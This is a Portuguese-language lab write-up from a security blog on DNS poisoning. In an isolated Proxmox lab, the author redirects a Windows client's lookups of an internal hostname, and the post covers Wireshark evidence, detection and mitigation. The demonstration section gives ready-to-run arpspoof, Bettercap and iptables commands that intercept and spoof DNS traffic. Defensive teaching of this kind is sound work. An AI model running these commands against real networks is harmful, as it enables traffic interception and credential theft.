---
title: "DNS Poisoning: demonstração, detecção e mitigação em laboratório"
date: 2026-02-02
layout: single
lang: pt-BR
translation_key: dns-poisoning
categories: [Laboratórios]
tags: [DNS, Poisoning, MITM, Wireshark]
excerpt: "Demonstração de DNS poisoning em um ambiente de laboratório controlado, incluindo análise, indicadores e estratégias de mitigação."
permalink: /pt/laboratorios/dns-poisoning/
header:
  teaser: /assets/images/DOOR-AJAR.jpg
  image: /assets/images/DOOR-AJAR.jpg
  overlay_filter: 0.3
  overlay_image: /assets/images/DOOR-AJAR.jpg
  image_description: "Uma pequena falha na confiança pode abrir caminho para o redirecionamento de tráfego por meio de DNS poisoning."
  image_height: 300px
author_profile: true
author: julia_pt
---

# DNS Poisoning

## Visão geral

Este projeto demonstra **DNS poisoning**, uma técnica que manipula respostas DNS para redirecionar o tráfego de servidores legítimos para destinos controlados por um atacante.

O laboratório foi dividido em três partes:

1. **Baseline A:** comunicação DNS normal;
2. **Baseline B:** demonstração de DNS poisoning;
3. **Mitigação:** prevenção, contenção e limpeza após o teste.

Todos os testes foram realizados em um laboratório **Proxmox**, usando máquinas virtuais conectadas à mesma bridge virtual.

## Estrutura do laboratório

| Função               | Hostname         | Descrição                                         |
| -------------------- | ---------------- | ------------------------------------------------- |
| **WINDOWS10_VICTIM** | Alvo de teste    | Cliente Windows 10 que realiza consultas DNS      |
| **KALI_ATTACKER**    | Máquina atacante | Executa Bettercap e scripts de ARP spoofing       |
| **DNS_SERVER**       | Raspberry Pi     | Resolvedor DNS local usando _dnsmasq_             |
| **UBUNTU_SERVER**    | Servidor web     | Site legítimo hospedado em `portal.company.local` |

**O que é DNS poisoning?**

DNS poisoning, também chamado de DNS spoofing, é um ataque em que um adversário falsifica respostas DNS para fazer com que um domínio legítimo resolva para um **endereço IP malicioso**.

Quando o usuário tenta acessar um domínio confiável, pode ser redirecionado silenciosamente para um host controlado pelo atacante, que pode:

- exibir páginas falsas ou maliciosas;
- capturar credenciais;
- injetar anúncios ou scripts;
- apoiar outros ataques man-in-the-middle, como em combinação com ARP spoofing.

**Objetivos comuns do atacante**

- distribuição de malware;
- redirecionamento de tráfego;
- roubo de credenciais;
- monitoramento ou interrupção de comunicações;
- contorno de restrições geográficas ou controles de segurança.

**Indicadores de DNS poisoning**

- redirecionamento para sites desconhecidos ou suspeitos;
- alertas do navegador sobre certificados TLS inválidos;
- respostas DNS inconsistentes entre resolvedores;
- respostas DNS duplicadas ou atrasadas;
- relatos de usuários sobre conteúdo alterado.

## Pré-requisitos

Antes de iniciar, prepare:

1. um **servidor DNS** em Raspberry Pi ou máquina Linux, usado como `DNS_SERVER`;
2. uma **máquina Kali**, usada como `KALI_ATTACKER`;
3. uma **máquina Windows 10**, usada como `WINDOWS10_VICTIM`, configurada para utilizar somente o `DNS_SERVER` como resolvedor DNS.

No Prompt de Comando do Windows, confirme a configuração com:

```text
ipconfig /all
```

A linha **DNS Servers** deve mostrar somente o endereço IP do Raspberry Pi.

## Baseline A — resolução DNS normal

No servidor Ubuntu (`UBUNTU_SERVER`), hospedei um site em `portal.company.local`. Esse hostname foi adicionado ao arquivo `dnsmasq.conf` no servidor DNS Raspberry Pi.

![Baseline A - dnsmasq.conf](/assets/images/dns-poisoning/RASPBERRY_PI_DNSMASQ.CONF_BASE_A.png)

Ao executar:

```text
nslookup portal.company.local
```

na máquina Windows 10, o endereço IP correto do servidor Ubuntu foi retornado, confirmando o funcionamento normal da resolução DNS.

![Baseline A - nslookup do Windows para o Ubuntu](/assets/images/dns-poisoning/BASE_A_NSLOOKUP_W10_TO_UBUNTU_BASE_A.png)

## Baseline B — demonstração de DNS poisoning

Usei o **Bettercap** na máquina Kali para interceptar o tráfego e falsificar respostas DNS dentro do laboratório controlado.

**Etapa 1 — iniciar ARP spoofing**

O objetivo foi redirecionar o tráfego entre a vítima e o servidor DNS por meio da máquina atacante:

```bash
sudo arpspoof -i eth0 192.168.0.53 192.168.0.30
sudo arpspoof -i eth0 192.168.0.30 192.168.0.53
```

A tabela ARP do Windows passou a mostrar o mesmo endereço MAC associado ao servidor DNS e à máquina atacante, indicando que o ARP spoofing estava ativo.

![Baseline B - tabela ARP da vítima Windows](/assets/images/dns-poisoning/ARP_TABLE_WINDOWS10_ARP_SPOOF_BASE_B.png)

**Etapa 2 — iniciar DNS spoofing**

```bash
sudo bettercap -iface eth0 -eval "
set dns.spoof.domains portal.company.local;
set dns.spoof.address KALI_ATTACKER;
set dns.spoof.all true;
arp.spoof on;
dns.spoof on;
events.stream on;"
```

Também seria possível adicionar:

```text
set arp.spoof.targets WINDOWS10_VICTIM,DNS_SERVER;
set arp.spoof.fullduplex true;
```

No meu laboratório, essa configuração não funcionou de forma confiável. Por isso, executei o ARP spoofing separadamente com `arpspoof`.

Depois disso, quando a vítima consultava `portal.company.local`, a resposta DNS passava a vir da máquina atacante, e não do servidor DNS legítimo.

**Etapa 3 — bloquear respostas DNS legítimas**

Para garantir que a vítima recebesse apenas a resposta falsificada, bloqueei na máquina Kali as respostas originadas pelo servidor DNS legítimo:

```bash
sudo iptables -I FORWARD -p udp -s DNS_SERVER --sport 53 -d WINDOWS10_VICTIM -j DROP
sudo iptables -I FORWARD -p tcp -s DNS_SERVER --sport 53 -d WINDOWS10_VICTIM -j DROP
```

Isso impediu que as respostas DNS do Raspberry Pi chegassem à vítima, deixando a resposta falsificada como a única recebida.

## Resultado

Na `WINDOWS10_VICTIM`, a consulta:

```text
nslookup portal.company.local
```

passou a retornar o endereço associado à máquina atacante.

![Baseline B - nslookup durante o DNS poisoning](/assets/images/dns-poisoning/NSLOOKUP_W10_BASE_B.png)

O endereço legítimo do servidor Ubuntu deixou de aparecer, confirmando que o redirecionamento funcionou no ambiente controlado.

O formato IPv6 mapeado observado na resposta também representou uma anomalia de rede que poderia servir como pista durante a investigação.

## Evidências da investigação

**Captura no Wireshark das respostas DNS falsificadas**

![Baseline B - respostas DNS falsificadas no Wireshark](/assets/images/dns-poisoning/WIRESHARK_KALI_DNS_BASEB.png)

**ICMP Redirects observados durante o teste**

![Baseline B - ICMP Redirects no Wireshark](/assets/images/dns-poisoning/WIRESHARK_KALI_BASE_B.png)

## Detecção e mitigação

**Detecção**

- Alertar sobre mensagens ICMP Redirect originadas de hosts que não sejam roteadores ou gateways legítimos.
- Correlacionar ICMP Redirects com alterações na tabela ARP e respostas DNS inesperadas.
- Monitorar frequências incomuns de mensagens ICMP Type 5.
- Comparar respostas DNS entre resolvedores confiáveis.
- Investigar alterações súbitas na associação entre endereços IP e MAC.

**Mitigação imediata**

Desabilitar a aceitação de ICMP Redirects nos endpoints.

No Linux:

```bash
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
```

No Windows, isso pode ser feito por configurações de rede ou pelo Registro, conforme a política do ambiente.

**Medidas de longo prazo**

- aplicar segmentação de rede;
- permitir que apenas roteadores confiáveis enviem redirects;
- usar DNSSEC;
- usar DNS-over-HTTPS ou DNS-over-TLS quando apropriado;
- reforçar controles de ARP e DHCP;
- monitorar anomalias de roteamento e respostas DNS inconsistentes;
- usar HTTPS e HSTS para reduzir o impacto de redirecionamentos maliciosos.

## Limpeza do laboratório

Após o teste, reverti as alterações para restaurar o ambiente.

**Na máquina Kali**

```bash
sudo iptables -D FORWARD -p udp -s 192.168.0.53 --sport 53 -d 192.168.0.30 -j DROP
sudo iptables -D FORWARD -p tcp -s 192.168.0.53 --sport 53 -d 192.168.0.30 -j DROP
sudo pkill -9 bettercap
sudo pkill -9 -f "sudo bettercap"
```

**Na máquina Windows 10**

```bash
netsh interface ip set dns "Ethernet" dhcp
ipconfig /flushdns
nslookup portal.company.local
```

**No Raspberry Pi**

```bash
sudo systemctl restart dnsmasq
```

Após a limpeza, a vítima voltou a resolver `portal.company.local` para o endereço IP legítimo do servidor Ubuntu.

## Como prevenir DNS poisoning

**Para usuários**

- limpar o cache DNS ao suspeitar de envenenamento;
- usar **DNS-over-HTTPS** ou **DNS-over-TLS** com resolvedores confiáveis;
- manter os sistemas atualizados;
- verificar alterações no arquivo `hosts`;
- preferir HTTPS e observar alertas de certificados;
- utilizar uma VPN que imponha resolvedores DNS confiáveis.

**Para administradores**

- habilitar **DNSSEC** para validação de respostas assinadas;
- proteger contas de registradores de domínio com MFA;
- restringir transferências de zona;
- monitorar alterações em registros DNS;
- utilizar provedores DNS confiáveis;
- aplicar **HTTPS + HSTS** nos serviços web;
- monitorar alterações inesperadas em ARP, DNS e roteamento.

## Conclusão

Este laboratório demonstrou, em um ambiente controlado:

- como respostas DNS falsificadas podem redirecionar tráfego;
- quais evidências de rede podem ajudar defensores a identificar a atividade;
- como restaurar o ambiente após o teste;
- quais medidas reduzem o risco de ataques semelhantes.
